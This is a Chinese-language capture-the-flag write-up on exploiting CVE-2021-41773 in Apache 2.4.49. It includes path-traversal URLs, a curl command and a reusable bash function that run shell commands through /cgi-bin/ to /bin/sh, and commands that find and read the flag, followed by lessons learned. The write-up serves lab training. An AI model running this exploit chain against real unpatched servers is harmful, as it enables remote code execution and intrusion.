## 题解

### 入口与指纹

`Apache/2.4.49 (Unix)`，首页是默认页：

```html
<html><body><h1>It works!</h1></body></html>
```

**版本号就是全部线索**：2.4.49 是 CVE-2021-41773 的原始受影响版本
（路径穿越；若启用 `mod_cgi`，可直接 RCE）。

### 关键观察

**1. 根路径的穿越被拒绝（403），但 `/cgi-bin/` 下的穿越可达。**

| 路径 | 结果 |
| --- | --- |
| `/.%2e/.%2e/.%2e/.%2e/etc/passwd` | 403 |
| `/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd` | **500**（进到了处理阶段） |
| `/cgi-bin/.%2e/.%2e/.%2e/bin/sh`（3 层） | 404 |
| **`/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh`（4 层）** | 可达 |

根路径 403 是因为该目录没有 `Require all granted`；`/cgi-bin/` 可访问，
所以从它出发的 4 级穿越正好到达 `/`。

**2. `mod_cgi` 在，POST body 就是 `/bin/sh` 的 stdin。**

```bash
curl -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-binary 'echo Content-Type: text/plain; echo; id' \
  'http://$T/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
```

```text
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

### 利用链

```bash
T=$(head -1 .target)
rce() {
  curl -sS -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-binary "echo Content-Type: text/plain; echo; $1" \
    "http://$T/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
}

rce 'id'
rce 'find / -maxdepth 3 -iname "*flag*" 2>/dev/null'   # 命中 /tmp/flag
rce 'cat /tmp/flag'
```

```text
flag{8989d370-8843-4a12-ad26-97ab35e1391f}
```

### flag 位置

容器内的 `/tmp/flag`（既不在 `/` 也不在 docroot，需要用 `find` 定位）。

## 复盘

- **2.4.49 / 2.4.50 这两个版本号基本可以直接判定 CVE-2021-41773/42013。**
  拿到 `Server:` 头先对版本，比盲测 payload 快。
- **穿越层数由"起点目录深度"决定。** `/cgi-bin/` 在根下第一层，所以 4 个
  `.%2e` 正好到 `/`；3 层到 `/usr`（不存在 `/usr/bin/sh` → 404）。
  判据：**500 = 到达了文件系统但目标不可执行；404 = 路径不对**。
- **根路径 403 ≠ 漏洞不存在。** 403 只说明该目录受 `Require` 限制；
  `/cgi-bin/` 往往单独放行，从它出发一样能穿越。
- **`mod_cgi` 把穿越升级成 RCE。** 判据是 POST body 被 `/bin/sh` 执行（`id` 回显）。
- **flag 位置不固定。** 这题在 `/tmp/flag`，`/`、`/FLAG.txt`、`/flag.txt` 都没有；
  拿到命令执行后 `find / -iname '*flag*'` 一次就能定位，比逐个试探快。
